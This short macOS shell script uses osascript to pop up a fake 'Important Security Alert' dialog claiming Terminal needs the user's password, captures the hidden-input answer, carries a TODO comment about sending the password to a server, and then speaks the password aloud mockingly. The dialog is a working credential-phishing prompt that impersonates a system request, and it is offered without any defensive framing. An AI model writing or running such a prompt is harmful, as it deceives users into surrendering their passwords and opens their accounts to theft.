PASSWORD=$(osascript -e 'tell app "Terminal" to activate' \
    -e 'tell app "Terminal" to activate' \
    -e 'tell app "Terminal" to display dialog "Terminal requires your password to continue." & return & return default answer "" with icon 1 with hidden answer with title "Important Security Alert"' 2>&1 | cut -d : -f 3)

# TODO: send the password to a server

say -r 250 "Thank you for your password! $PASSWORD wasn't very secure anyway. Goodbye!"
